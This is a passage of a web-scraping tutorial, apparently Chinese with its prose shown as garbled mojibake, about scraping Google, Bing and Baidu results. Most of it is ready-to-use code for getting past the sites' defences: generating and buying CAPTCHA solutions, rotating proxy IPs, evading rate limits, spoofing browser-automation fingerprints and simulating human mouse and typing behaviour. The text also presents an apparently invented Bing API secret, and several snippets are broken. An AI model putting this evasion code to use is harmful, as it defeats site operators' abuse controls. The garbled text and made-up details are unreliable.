        if 'captcha' in response.text.lower() or response.status_code == 429:
            print(f&quot;CAPTCHA triggered after {request_count} requests&quot;)
            captcha_triggered = True
        else:
            print(f&quot;Request {request_count}: OK&quot;)
            time.sleep(1)  # æ¯ç§’ 1 æ¬¡è¯·æ±‚

test_rate_limit()
</code></pre>
<p><strong>ç»“æœ</strong>:</p>
<ul>
<li>Google: çº¦ 20-30 æ¬¡/åˆ†é’Ÿï¼ˆIPï¼‰</li>
<li>Bing: çº¦ 50-60 æ¬¡/åˆ†é’Ÿ</li>
<li>ç™¾åº¦: çº¦ 100 æ¬¡/åˆ†é’Ÿ</li>
</ul>
<h4>2. reCAPTCHA v3 ç»•è¿‡</h4>
<p>reCAPTCHA v3 ä¸æ˜¾ç¤ºéªŒè¯ç ï¼Œè€Œæ˜¯è¯„åˆ†ï¼ˆ0.0-1.0ï¼‰:</p>
<pre><code class="language-python">from playwright.sync_api import sync_playwright
import time

class RecaptchaV3Bypass:
    def __init__(self):
        self.playwright = None
        self.browser = None

    def solve_recaptcha(self, url, site_key, action='search'):
        &quot;&quot;&quot;
        é€šè¿‡æ¨¡æ‹ŸçœŸå®ç”¨æˆ·è¡Œä¸ºæ¥æé«˜ reCAPTCHA è¯„åˆ†
        &quot;&quot;&quot;
        with sync_playwright() as p:
            # ä½¿ç”¨çœŸå®æµè§ˆå™¨é…ç½®
            browser = p.chromium.launch(
                headless=False,  # éæ— å¤´æ¨¡å¼è¯„åˆ†æ›´é«˜
                args=[
                    '--disable-blink-features=AutomationControlled',
                    '--disable-dev-shm-usage'
                ]
            )

            context = browser.new_context(
                viewport={'width': 1920, 'height': 1080},
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            )

            # åŠ è½½çœŸå® Cookieï¼ˆä»æµè§ˆå™¨å¯¼å‡ºï¼‰
            context.add_cookies([
                {
                    'name': 'NID',
                    'value': 'your_google_cookie',
                    'domain': '.google.com',
                    'path': '/'
                }
            ])

            page = context.new_page()

            # æ¨¡æ‹ŸçœŸå®ç”¨æˆ·è¡Œä¸º
            page.goto(url)

            # éšæœºé¼ æ ‡ç§»åŠ¨
            for _ in range(10):
                x = random.randint(100, 800)
                y = random.randint(100, 600)
                page.mouse.move(x, y)
                time.sleep(random.uniform(0.1, 0.3))

            # è§¦å‘ reCAPTCHA
            token = page.evaluate(f&quot;&quot;&quot;
                new Promise((resolve) =&gt; {{
                    grecaptcha.ready(() =&gt; {{
                        grecaptcha.execute('{site_key}', {{action: '{action}'}})
                            .then(token =&gt; resolve(token));
                    }});
                }})
            &quot;&quot;&quot;)

            browser.close()
            return token

    def search_with_recaptcha(self, query):
        &quot;&quot;&quot;å¸¦ reCAPTCHA çš„æœç´¢&quot;&quot;&quot;
        token = self.solve_recaptcha(
            'https://www.google.com',
            site_key='6LfxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxE'
        )

        # ä½¿ç”¨ token è¿›è¡Œæœç´¢
        response = requests.get(
            'https://www.google.com/search',
            params={
                'q': query,
                'recaptcha_token': token
            }
        )

        return response.text
</code></pre>
<h4>3. ä½¿ç”¨ç¬¬ä¸‰æ–¹ CAPTCHA æ±‚è§£æœåŠ¡</h4>
<pre><code class="language-python">import requests
from twocaptcha import TwoCaptcha

class CaptchaSolver:
    def __init__(self, api_key):
        self.solver = TwoCaptcha(api_key)

    def solve_recaptcha_v2(self, site_key, page_url):
        &quot;&quot;&quot;æ±‚è§£ reCAPTCHA v2&quot;&quot;&quot;
        try:
            result = self.solver.recaptcha(
                sitekey=site_key,
                url=page_url
            )

            return result['code']

        except Exception as e:
            print(f&quot;Error: {e}&quot;)
            return None

    def solve_hcaptcha(self, site_key, page_url):
        &quot;&quot;&quot;æ±‚è§£ hCaptcha&quot;&quot;&quot;
        try:
            result = self.solver.hcaptcha(
                sitekey=site_key,
                url=page_url
            )

            return result['code']

        except Exception as e:
            print(f&quot;Error: {e}&quot;)
            return None

# ä½¿ç”¨ç¤ºä¾‹
solver = CaptchaSolver(api_key='your_2captcha_api_key')
token = solver.solve_recaptcha_v2(
    site_key='6LfxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxE',
    page_url='https://www.google.com/search?q=test'
)

# æäº¤å¸¦ token çš„è¯·æ±‚
response = requests.post(
    'https://www.google.com/search',
    data={
        'q': 'test',
        'g-recaptcha-response': token
    }
)
</code></pre>
<h3>é¢‘ç‡é™åˆ¶ç»•è¿‡</h3>
<h4>1. IP è½®æ¢</h4>
<pre><code class="language-python">import requests
from itertools import cycle

class ProxyRotator:
    def __init__(self, proxy_list):
        &quot;&quot;&quot;
        proxy_list: ['http://1.2.3.4:8080', 'http://5.6.7.8:8080', ...]
        &quot;&quot;&quot;
        self.proxy_pool = cycle(proxy_list)
        self.session = requests.Session()

    def get_with_rotation(self, url, params=None):
        &quot;&quot;&quot;ä½¿ç”¨ä»£ç†è½®æ¢å‘é€è¯·æ±‚&quot;&quot;&quot;
        max_retries = 5

        for _ in range(max_retries):
            proxy = next(self.proxy_pool)

            try:
                response = self.session.get(
                    url,
                    params=params,
                    proxies={'http': proxy, 'https': proxy},
                    timeout=10
                )

                if response.status_code == 200:
                    return response

            except Exception as e:
                print(f&quot;Proxy {proxy} failed: {e}&quot;)
                continue

        raise Exception(&quot;All proxies failed&quot;)

# ä½¿ç”¨ä»£ç†æ± è¿›è¡Œæœç´¢
proxy_list = [
    'http://proxy1.example.com:8080',
    'http://proxy2.example.com:8080',
    'http://proxy3.example.com:8080',
]

rotator = ProxyRotator(proxy_list)

for i in range(100):
    response = rotator.get_with_rotation(
        'https://www.google.com/search',
        params={'q': f'query {i}'}
    )
    print(f&quot;Search {i}: {response.status_code}&quot;)
</code></pre>
<h4>2. è¯·æ±‚é—´éš”éšæœºåŒ–</h4>
<pre><code class="language-python">import random
import time

class RateLimitEvader:
    def __init__(self, min_delay=2.0, max_delay=5.0):
        self.min_delay = min_delay
        self.max_delay = max_delay
        self.last_request_time = 0

    def wait(self):
        &quot;&quot;&quot;æ™ºèƒ½ç­‰å¾…ï¼Œé¿å…è¢«æ£€æµ‹&quot;&quot;&quot;
        current_time = time.time()
        elapsed = current_time - self.last_request_time

        # ä½¿ç”¨æ­£æ€åˆ†å¸ƒç”Ÿæˆå»¶è¿Ÿï¼ˆæ›´æ¥è¿‘äººç±»è¡Œä¸ºï¼‰
        delay = random.gauss(
            (self.min_delay + self.max_delay) / 2,
            (self.max_delay - self.min_delay) / 4
        )
        delay = max(self.min_delay, min(self.max_delay, delay))

        if elapsed &lt; delay:
            time.sleep(delay - elapsed)

        self.last_request_time = time.time()

    def search(self, query):
        &quot;&quot;&quot;å¸¦æ™ºèƒ½å»¶è¿Ÿçš„æœç´¢&quot;&quot;&quot;
        self.wait()

        response = requests.get(
            'https://www.google.com/search',
            params={'q': query}
        )

        return response.text

# ä½¿ç”¨ç¤ºä¾‹
evader = RateLimitEvader(min_delay=3.0, max_delay=7.0)

for i in range(100):
    result = evader.search(f'query {i}')
    print(f&quot;Search {i} completed&quot;)
</code></pre>
<hr />
<h2>æ¡ˆä¾‹ 2: æœç´¢ç»“æœ API é€†å‘</h2>
<h3>èƒŒæ™¯</h3>
<p>æœç´¢å¼•æ“é€šå¸¸æœ‰å†…éƒ¨ APIï¼ˆç”¨äºè‡ªåŠ¨è¡¥å…¨ã€ç›¸å…³æœç´¢ç­‰ï¼‰ï¼Œè¿™äº› API çš„é˜²æŠ¤ç›¸å¯¹è¾ƒå¼±ã€‚</p>
<h3>é€†å‘æ­¥éª¤</h3>
<h4>1. å‘ç°éšè— API</h4>
<p>ä½¿ç”¨ Chrome DevTools ç›‘æ§ç½‘ç»œè¯·æ±‚:</p>
<p><strong>Google è‡ªåŠ¨è¡¥å…¨ API</strong>:</p>
<pre><code>GET /complete/search?q=python&amp;client=chrome HTTP/1.1
Host: www.google.com
</code></pre>
<p><strong>å“åº”</strong>:</p>
<pre><code class="language-json">[
  &quot;python&quot;,
  [&quot;python tutorial&quot;, &quot;python download&quot;, &quot;python for beginners&quot;, &quot;python snake&quot;]
]
</code></pre>
<p><strong>Bing æœç´¢å»ºè®® API</strong>:</p>
<pre><code>GET /AS/Suggestions?pt=page.home&amp;mkt=en-US&amp;qry=javascript&amp;cp=10&amp;cvid=xxx
Host: www.bing.com
</code></pre>
<h4>2. é€†å‘ç­¾åç®—æ³•</h4>
<p>æŸäº› API éœ€è¦ç­¾åå‚æ•°:</p>
<pre><code class="language-javascript">// åœ¨ Bing æœç´¢é¡µé¢çš„ JS ä¸­æ‰¾åˆ°
function generateSearchSignature(query, timestamp) {
  const secret = &quot;bing_api_secret_2024&quot;;
  const str = `${query}|${timestamp}|${secret}`;
  return CryptoJS.SHA256(str).toString();
}

function searchAPI(query) {
  const timestamp = Date.now();
  const sig = generateSearchSignature(query, timestamp);

  return fetch(
    `/api/search?q=${encodeURIComponent(query)}&amp;t=${timestamp}&amp;sig=${sig}`
  ).then((r) =&gt; r.json());
}
</code></pre>
<h3>Python å®ç°</h3>
<pre><code class="language-python">import requests
import hashlib
import time
import json

class SearchEngineAPI:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Referer': 'https://www.google.com/'
        })

    def google_autocomplete(self, query):
        &quot;&quot;&quot;Google è‡ªåŠ¨è¡¥å…¨ API&quot;&quot;&quot;
        url = 'https://www.google.com/complete/search'
        params = {
            'q': query,
            'client': 'chrome',  # æˆ– 'firefox', 'safari'
            'hl': 'en'
        }

        response = self.session.get(url, params=params)

        # å“åº”æ ¼å¼: [query, [suggestions], ...]
        data = response.json()
        return data[1] if len(data) &gt; 1 else []

    def bing_suggestions(self, query):
        &quot;&quot;&quot;Bing æœç´¢å»ºè®® API&quot;&quot;&quot;
        url = 'https://www.bing.com/AS/Suggestions'
        params = {
            'pt': 'page.home',
            'mkt': 'en-US',
            'qry': query,
            'cp': len(query),
            'cvid': self._generate_cvid()
        }

        response = self.session.get(url, params=params)
        data = response.json()

        # æå–å»ºè®®
        suggestions = []
        for group in data.get('AS', {}).get('Results', []):
            for item in group.get('Suggests', []):
                suggestions.append(item.get('Txt'))

        return suggestions

    def _generate_cvid(self):
        &quot;&quot;&quot;ç”Ÿæˆ Bing çš„ CVID (Correlation Vector ID)&quot;&quot;&quot;
        import uuid
        return str(uuid.uuid4()).replace('-', '')

    def baidu_suggestion(self, query):
        &quot;&quot;&quot;ç™¾åº¦æœç´¢å»ºè®® API&quot;&quot;&quot;
        url = 'https://www.baidu.com/sugrec'
        params = {
            'prod': 'pc',
            'wd': query,
            'cb': 'jQuery'  # JSONP callback
        }

        response = self.session.get(url, params=params)

        # è§£æ JSONP å“åº”
        text = response.text
        json_str = text[text.index('(') + 1:text.rindex(')')]
        data = json.loads(json_str)

        suggestions = [item['q'] for item in data.get('g', [])]
        return suggestions

    def signed_search(self, query, secret_key=&quot;bing_api_secret_2024&quot;):
        &quot;&quot;&quot;å¸¦ç­¾åçš„æœç´¢ API&quot;&quot;&quot;
        timestamp = int(time.time())
        sig = self._generate_signature(query, timestamp, secret_key)

        url = 'https://api.search.example.com/search'
        params = {
            'q': query,
            't': timestamp,
            'sig': sig
        }

        response = self.session.get(url, params=params)
        return response.json()

    def _generate_signature(self, query, timestamp, secret):
        &quot;&quot;&quot;ç”Ÿæˆæœç´¢ç­¾å&quot;&quot;&quot;
        str_to_sign = f&quot;{query}|{timestamp}|{secret}&quot;
        return hashlib.sha256(str_to_sign.encode()).hexdigest()

# ä½¿ç”¨ç¤ºä¾‹
api = SearchEngineAPI()

# Google è‡ªåŠ¨è¡¥å…¨
suggestions = api.google_autocomplete('python')
print(&quot;Google suggestions:&quot;, suggestions)

# Bing å»ºè®®
bing_suggestions = api.bing_suggestions('javascript')
print(&quot;Bing suggestions:&quot;, bing_suggestions)

# ç™¾åº¦å»ºè®®
baidu_suggestions = api.baidu_suggestion('æœºå™¨å­¦ä¹ ')
print(&quot;Baidu suggestions:&quot;, baidu_suggestions)
</code></pre>
<hr />
<h2>æ¡ˆä¾‹ 3: JavaScript æ¸²æŸ“ç»“æœæå–</h2>
<h3>èƒŒæ™¯</h3>
<p>ç°ä»£æœç´¢å¼•æ“å¤§é‡ä½¿ç”¨ JavaScript æ¸²æŸ“ç»“æœï¼ˆSPAï¼‰ï¼Œé™æ€çˆ¬è™«æ— æ³•è·å–å®Œæ•´å†…å®¹ã€‚</p>
<h3>æŒ‘æˆ˜</h3>
<ul>
<li><strong>åŠ¨æ€åŠ è½½</strong>: æ»šåŠ¨åŠ è½½æ›´å¤šç»“æœ</li>
<li><strong>å»¶è¿Ÿæ¸²æŸ“</strong>: ç»“æœåˆ†æ‰¹æ¸²æŸ“</li>
<li><strong>åè°ƒè¯•</strong>: æ£€æµ‹ DevToolsã€Selenium</li>
</ul>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. ä½¿ç”¨ Playwrightï¼ˆæ¨èï¼‰</h4>
<pre><code class="language-python">from playwright.sync_api import sync_playwright
import time

class JavaScriptSearchScraper:
    def __init__(self):
        self.playwright = None
        self.browser = None
        self.context = None

    def setup(self):
        &quot;&quot;&quot;åˆå§‹åŒ–æµè§ˆå™¨&quot;&quot;&quot;
        self.playwright = sync_playwright().start()

        # ä½¿ç”¨éšèº«æ¨¡å¼ï¼Œé¿å…æ£€æµ‹
        self.browser = self.playwright.chromium.launch(
            headless=True,
            args=[
                '--disable-blink-features=AutomationControlled',
                '--disable-dev-shm-usage',
                '--no-sandbox'
            ]
        )

        # ä¿®æ”¹ navigator.webdriver
        self.context = self.browser.new_context(
            viewport={'width': 1920, 'height': 1080},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        )

        self.context.add_init_script(&quot;&quot;&quot;
            Object.defineProperty(navigator, 'webdriver', {
                get: () =&gt; undefined
            });
        &quot;&quot;&quot;)

    def search_google(self, query, num_results=100):
        &quot;&quot;&quot;æœç´¢ Google å¹¶æå–ç»“æœ&quot;&quot;&quot;
        page = self.context.new_page()

        # è®¿é—®æœç´¢é¡µé¢
        page.goto(f'https://www.google.com/search?q={query}')

        # ç­‰å¾…ç»“æœåŠ è½½
        page.wait_for_selector('#search', timeout=10000)

        results = []
        loaded_results = 0

        # æ»šåŠ¨åŠ è½½æ›´å¤šç»“æœ
        while loaded_results &lt; num_results:
            # æå–å½“å‰å¯è§ç»“æœ
            items = page.query_selector_all('.g')

            for item in items[loaded_results:]:
                try:
                    title_elem = item.query_selector('h3')
                    link_elem = item.query_selector('a')
                    snippet_elem = item.query_selector('.VwiC3b')

                    if title_elem and link_elem:
                        results.append({
                            'title': title_elem.inner_text(),
                            'url': link_elem.get_attribute('href'),
                            'snippet': snippet_elem.inner_text() if snippet_elem else ''
                        })

                except Exception as e:
                    continue

            loaded_results = len(results)

            # æ»šåŠ¨åˆ°åº•éƒ¨
            page.evaluate('window.scrollTo(0, document.body.scrollHeight)')
            time.sleep(1)

            # æ£€æŸ¥æ˜¯å¦æœ‰&quot;æ›´å¤šç»“æœ&quot;æŒ‰é’®
            more_button = page.query_selector('a#pnnext')
            if more_button and loaded_results &lt; num_results:
                more_button.click()
                page.wait_for_load_state('networkidle')
            else:
                break

        page.close()
        return results

    def search_bing(self, query):
        &quot;&quot;&quot;æœç´¢ Bingï¼ˆå¤„ç†æ— é™æ»šåŠ¨ï¼‰&quot;&quot;&quot;
        page = self.context.new_page()
        page.goto(f'https://www.bing.com/search?q={query}')

        # ç­‰å¾…ç»“æœ
        page.wait_for_selector('.b_algo')

        results = []
        last_height = 0

        # æ— é™æ»šåŠ¨
        while True:
            # æå–ç»“æœ
            items = page.query_selector_all('.b_algo')

            for item in items[len(results):]:
                try:
                    title = item.query_selector('h2').inner_text()
                    url = item.query_selector('a').get_attribute('href')
                    snippet = item.query_selector('.b_caption p').inner_text()

                    results.append({
                        'title': title,
                        'url': url,
                        'snippet': snippet
                    })

                except:
                    continue

            # æ»šåŠ¨
            page.evaluate('window.scrollTo(0, document.body.scrollHeight)')
            time.sleep(2)

            # æ£€æŸ¥æ˜¯å¦åŠ è½½äº†æ–°å†…å®¹
            new_height = page.evaluate('document.body.scrollHeight')
            if new_height == last_height:
                break

            last_height = new_height

        page.close()
        return results

    def cleanup(self):
        &quot;&quot;&quot;æ¸…ç†èµ„æº&quot;&quot;&quot;
        if self.context:
            self.context.close()
        if self.browser:
            self.browser.close()
        if self.playwright:
            self.playwright.stop()

# ä½¿ç”¨ç¤ºä¾‹
scraper = JavaScriptSearchScraper()
scraper.setup()

try:
    google_results = scraper.search_google('python tutorial', num_results=50)
    print(f&quot;Found {len(google_results)} Google results&quot;)

    for result in google_results[:5]:
        print(f&quot;- {result['title']}: {result['url']}&quot;)

finally:
    scraper.cleanup()
</code></pre>
<h4>2. ç»•è¿‡åè‡ªåŠ¨åŒ–æ£€æµ‹</h4>
<pre><code class="language-python">from playwright.sync_api import sync_playwright
from playwright_stealth import stealth_sync

class StealthScraper:
    def __init__(self):
        self.playwright = sync_playwright().start()

        # ä½¿ç”¨ playwright-stealth æ’ä»¶
        self.browser = self.playwright.chromium.launch(headless=True)
        self.context = self.browser.new_context()

    def scrape_with_stealth(self, url):
        &quot;&quot;&quot;ä½¿ç”¨éšèº«æ¨¡å¼çˆ¬å–&quot;&quot;&quot;
        page = self.context.new_page()

        # åº”ç”¨ stealth æ¨¡å¼
        stealth_sync(page)

        # æ·»åŠ é¢å¤–çš„åæ£€æµ‹æªæ–½
        page.add_init_script(&quot;&quot;&quot;
            // è¦†ç›– navigator.webdriver
            Object.defineProperty(navigator, 'webdriver', {
                get: () =&gt; undefined
            });

            // è¦†ç›– chrome å¯¹è±¡
            window.chrome = {
                runtime: {}
            };

            // è¦†ç›– permissions
            const originalQuery = window.navigator.permissions.query;
            window.navigator.permissions.query = (parameters) =&gt; (
                parameters.name === 'notifications' ?
                    Promise.resolve({ state: Notification.permission }) :
                    originalQuery(parameters)
            );

            // è¦†ç›– plugins
            Object.defineProperty(navigator, 'plugins', {
                get: () =&gt; [1, 2, 3, 4, 5]
            });

            // è¦†ç›– languages
            Object.defineProperty(navigator, 'languages', {
                get: () =&gt; ['en-US', 'en']
            });
        &quot;&quot;&quot;)

        page.goto(url)
        return page.content()
</code></pre>
<hr />
<h2>æ¡ˆä¾‹ 4: æœç´¢æ’åç›‘æ§</h2>
<h3>èƒŒæ™¯</h3>
<p>SEO å·¥å…·éœ€è¦ç›‘æ§å…³é”®è¯æ’åï¼Œä½†æœç´¢å¼•æ“ä¼šè¿”å›ä¸ªæ€§åŒ–ç»“æœã€‚</p>
<h3>è§£å†³æ–¹æ¡ˆ</h3>
<h4>1. ç¦ç”¨ä¸ªæ€§åŒ–</h4>
<pre><code class="language-python">class UnbiasedSearchMonitor:
    def __init__(self):
        self.session = requests.Session()

    def google_unbiased_search(self, query):
        &quot;&quot;&quot;è·å–éä¸ªæ€§åŒ–çš„ Google æœç´¢ç»“æœ&quot;&quot;&quot;
        url = 'https://www.google.com/search'

        # ä½¿ç”¨ç‰¹æ®Šå‚æ•°ç¦ç”¨ä¸ªæ€§åŒ–
        params = {
            'q': query,
            'pws': '0',  # Disable personalization
            'gl': 'us',  # Geo-location: US
            'hl': 'en',  # Language: English
            'num': 100   # Results per page
        }

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept': 'text/html,application/xhtml+xml',
            # ä¸å‘é€ Cookieï¼ˆé¿å…ä¸ªæ€§åŒ–ï¼‰
        }

        response = self.session.get(url, params=params, headers=headers)
        return self.parse_results(response.text)

    def parse_results(self, html):
        &quot;&quot;&quot;è§£ææœç´¢ç»“æœ&quot;&quot;&quot;
        from bs4 import BeautifulSoup

        soup = BeautifulSoup(html, 'html.parser')
        results = []

        # æŸ¥æ‰¾æ‰€æœ‰æœç´¢ç»“æœ
        for index, item in enumerate(soup.select('.g'), start=1):
            title_elem = item.select_one('h3')
            link_elem = item.select_one('a')

            if title_elem and link_elem:
                url = link_elem.get('href', '')

                results.append({
                    'rank': index,
                    'title': title_elem.get_text(),
                    'url': url,
                    'domain': self.extract_domain(url)
                })

        return results

    def extract_domain(self, url):
        &quot;&quot;&quot;æå–åŸŸå&quot;&quot;&quot;
        from urllib.parse import urlparse
        parsed = urlparse(url)
        return parsed.netloc

    def track_keyword_ranking(self, keyword, target_domain):
        &quot;&quot;&quot;è¿½è¸ªå…³é”®è¯æ’å&quot;&quot;&quot;
        results = self.google_unbiased_search(keyword)

        for result in results:
            if target_domain in result['domain']:
                return result['rank']

        return None  # æœªè¿›å…¥å‰ 100

# ä½¿ç”¨ç¤ºä¾‹
monitor = UnbiasedSearchMonitor()

ranking = monitor.track_keyword_ranking(
    keyword='web scraping tutorial',
    target_domain='example.com'
)

print(f&quot;Current ranking: {ranking if ranking else 'Not in top 100'}&quot;)
</code></pre>
<h4>2. æ‰¹é‡æ’åç›‘æ§</h4>
<pre><code class="language-python">import asyncio
import aiohttp
from typing import List, Dict

class BatchRankingMonitor:
    def __init__(self, keywords: List[str], target_domain: str):
        self.keywords = keywords
        self.target_domain = target_domain

    async def check_ranking(self, session, keyword):
        &quot;&quot;&quot;å¼‚æ­¥æ£€æŸ¥å•ä¸ªå…³é”®è¯æ’å&quot;&quot;&quot;
        url = 'https://www.google.com/search'
        params = {
            'q': keyword,
            'pws': '0',
            'gl': 'us',
            'num': 100
        }

        async with session.get(url, params=params) as response:
            html = await response.text()

            # ç®€å•è§£æï¼ˆå®é™…åº”ä½¿ç”¨ BeautifulSoupï¼‰
            if self.target_domain in html:
                # è®¡ç®—æ’åï¼ˆç®€åŒ–ç‰ˆæœ¬ï¼‰
                rank = html.index(self.target_domain) // 1000  # ç²—ç•¥ä¼°ç®—
                return {'keyword': keyword, 'rank': rank}
            else:
                return {'keyword': keyword, 'rank': None}

    async def check_all(self):
        &quot;&quot;&quot;æ‰¹é‡æ£€æŸ¥æ‰€æœ‰å…³é”®è¯&quot;&quot;&quot;
        async with aiohttp.ClientSession() as session:
            tasks = [
                self.check_ranking(session, kw)
                for kw in self.keywords
            ]

            results = await asyncio.gather(*tasks)
            return results

# ä½¿ç”¨ç¤ºä¾‹
async def main():
    keywords = [
        'python tutorial',
        'web scraping',
        'data analysis',
        'machine learning'
    ]

    monitor = BatchRankingMonitor(keywords, 'example.com')
    results = await monitor.check_all()

    for result in results:
        print(f&quot;{result['keyword']}: Rank {result['rank']}&quot;)

asyncio.run(main())
</code></pre>
<hr />
<h2>æ¡ˆä¾‹ 5: è¡Œä¸ºæ£€æµ‹ä¸è§„é¿</h2>
<h3>èƒŒæ™¯</h3>
<p>æœç´¢å¼•æ“ä½¿ç”¨æœºå™¨å­¦ä¹ åˆ†æç”¨æˆ·è¡Œä¸ºï¼Œæ£€æµ‹çˆ¬è™«ã€‚</p>
<h3>æ£€æµ‹æŒ‡æ ‡</h3>
<ol>
<li><strong>é¼ æ ‡è½¨è¿¹</strong>: çœŸå®ç”¨æˆ·æœ‰ä¸è§„åˆ™çš„é¼ æ ‡ç§»åŠ¨</li>
<li><strong>é”®ç›˜è¾“å…¥</strong>: çœŸå®ç”¨æˆ·æœ‰è¾“å…¥å»¶è¿Ÿå’Œé”™è¯¯</li>
<li><strong>æ»šåŠ¨æ¨¡å¼</strong>: çœŸå®ç”¨æˆ·æ»šåŠ¨ä¸å‡åŒ€</li>
<li><strong>ç‚¹å‡»æ¨¡å¼</strong>: çœŸå®ç”¨æˆ·æœ‰çŠ¹è±«ã€å›é€€</li>
<li><strong>æµè§ˆå†å²</strong>: çœŸå®ç”¨æˆ·æœ‰è·¨é¡µé¢æµè§ˆ</li>
</ol>
<h3>å¯¹æŠ—ç­–ç•¥</h3>
<pre><code class="language-python">from playwright.sync_api import sync_playwright
import random
import time
import numpy as np

class HumanBehaviorSimulator:
    def __init__(self):
        self.playwright = None
        self.browser = None
        self.page = None

    def setup(self):
        &quot;&quot;&quot;åˆå§‹åŒ–&quot;&quot;&quot;
        self.playwright = sync_playwright().start()
        self.browser = self.playwright.chromium.launch(headless=False)
        self.page = self.browser.new_page()

    def human_mouse_move(self, from_x, from_y, to_x, to_y):
        &quot;&quot;&quot;æ¨¡æ‹Ÿäººç±»é¼ æ ‡è½¨è¿¹ï¼ˆè´å¡å°”æ›²çº¿ï¼‰&quot;&quot;&quot;
        steps = random.randint(20, 40)

        # æ§åˆ¶ç‚¹ï¼ˆéšæœºåç§»ï¼‰
        cp1_x = from_x + (to_x - from_x) * random.uniform(0.2, 0.4) + random.uniform(-50, 50)
        cp1_y = from_y + (to_y - from_y) * random.uniform(0.2, 0.4) + random.uniform(-50, 50)
        cp2_x = from_x + (to_x - from_x) * random.uniform(0.6, 0.8) + random.uniform(-50, 50)
        cp2_y = from_y + (to_y - from_y) * random.uniform(0.6, 0.8) + random.uniform(-50, 50)

        for i in range(steps + 1):
            t = i / steps

            # ä¸‰æ¬¡è´å¡å°”æ›²çº¿
            x = (1-t)**3 * from_x + \
                3*(1-t)**2*t * cp1_x + \
                3*(1-t)*t**2 * cp2_x + \
                t**3 * to_x

            y = (1-t)**3 * from_y + \
                3*(1-t)**2*t * cp1_y + \
                3*(1-t)*t**2 * cp2_y + \
                t**3 * to_y

            self.page.mouse.move(x, y)
            time.sleep(random.uniform(0.005, 0.02))

    def human_typing(self, text, element_selector):
        &quot;&quot;&quot;æ¨¡æ‹Ÿäººç±»æ‰“å­—ï¼ˆå¸¦å»¶è¿Ÿå’Œé”™è¯¯ï¼‰&quot;&quot;&quot;
        element = self.page.query_selector(element_selector)

        for char in text:
            # éšæœºå»¶è¿Ÿ
            delay = random.gauss(0.15, 0.05)  # å¹³å‡ 150ms
            time.sleep(max(0.05, delay))

            # å¶å°”æ‰“é”™å­—
            if random.random() &lt; 0.05:
                wrong_char = random.choice('abcdefghijklmnopqrstuvwxyz')
                element.type(wrong_char)
                time.sleep(random.uniform(0.1, 0.3))
                # åˆ é™¤é”™å­—
                self.page.keyboard.press('Backspace')
                time.sleep(random.uniform(0.05, 0.15))

            element.type(char)

    def human_scroll(self, target_y):
        &quot;&quot;&quot;æ¨¡æ‹Ÿäººç±»æ»šåŠ¨&quot;&quot;&quot;
        current_y = self.page.evaluate('window.pageYOffset')

        distance = target_y - current_y
        steps = random.randint(10, 20)

        for i in range(steps):
            # åŠ é€Ÿ -&gt; å‡é€Ÿ
            if i &lt; steps / 2:
                # åŠ é€Ÿé˜¶æ®µ
                scroll_amount = distance / steps * (i + 1) / (steps / 2)
            else:
                # å‡é€Ÿé˜¶æ®µ
                scroll_amount = distance / steps * (steps - i) / (steps / 2)

            self.page.evaluate(f'window.scrollBy(0, {scroll_amount})')
            time.sleep(random.uniform(0.02, 0.05))

        # å¶å°”å‘ä¸Šå¾®è°ƒ
        if random.random() &lt; 0.3:
            self.page.evaluate('window.scrollBy(0, -50)')
            time.sleep(random.uniform(0.1, 0.3))

    def human_search(self, query):
        &quot;&quot;&quot;æ¨¡æ‹Ÿäººç±»æœç´¢è¡Œä¸º&quot;&quot;&quot;
        # è®¿é—®é¦–é¡µ
        self.page.goto('https://www.google.com')
        time.sleep(random.uniform(0.5, 1.5))

        # ç§»åŠ¨é¼ æ ‡åˆ°æœç´¢æ¡†
        search_box = self.page.query_selector('input[name=&quot;q&quot;]')
        box_position = search_box.bounding_box()

        # ä»éšæœºä½ç½®ç§»åŠ¨åˆ°æœç´¢æ¡†
        self.human_mouse_move(
            random.randint(100, 500),
            random.randint(100, 400),
            box_position['x'] + box_position['width'] / 2,
            box_position['y'] + box_position['height'] / 2
        )

        # ç‚¹å‡»æœç´¢æ¡†
        search_box.click()
        time.sleep(random.uniform(0.2, 0.5))

        # äººç±»åŒ–æ‰“å­—
        self.human_typing(query, 'input[name=&quot;q&quot;]')

        # éšæœºé€‰æ‹©æäº¤æ–¹å¼
        if random.random() &lt; 0.7:
            # 70% æŒ‰å›è½¦
            self.page.keyboard.press('Enter')
        else:
            # 30% ç‚¹å‡»æœç´¢æŒ‰é’®
            search_button = self.page.query_selector('input[name=&quot;btnK&quot;]')
            if search_button:
                search_button.click()

        # ç­‰å¾…ç»“æœ
        self.page.wait_for_selector('#search')
        time.sleep(random.uniform(1.0, 2.0))

        # æ¨¡æ‹Ÿæµè§ˆç»“æœï¼ˆæ»šåŠ¨ã€é˜…è¯»ï¼‰
        self.human_scroll(random.randint(500, 1500))
        time.sleep(random.uniform(2.0, 4.0))

        # æå–ç»“æœ
        results = []
        items = self.page.query_selector_all('.g')

        for item in items:
            try:
                title = item.query_selector('h3').inner_text()
                url = item.query_selector('a').get_attribute('href')
                results.append({'title': title, 'url': url})
            except:
                continue

        return results

    def cleanup(self):
        &quot;&quot;&quot;æ¸…ç†&quot;&quot;&quot;
        if self.browser:
            self.browser.close()
        if self.playwright:
            self.playwright.stop()

# ä½¿ç”¨ç¤ºä¾‹
simulator = HumanBehaviorSimulator()
simulator.setup()

try:
    results = simulator.human_search('python web scraping')
    print(f&quot;Found {len(results)} results&quot;)

    for result in results[:5]:
        print(f&quot;- {result['title']}&quot;)

finally:
    simulator.cleanup()
</code></pre>
<hr />
<h2>é˜²æŠ¤ä¸å¯¹æŠ—æ€»ç»“</h2>
<h3>æœç´¢å¼•æ“é˜²æŠ¤</h3>
<ol>
<li><strong>CAPTCHA</strong>: reCAPTCHA v2/v3, hCaptcha</li>
<li><strong>é¢‘ç‡é™åˆ¶</strong>: IPã€Cookieã€User-Agent</li>
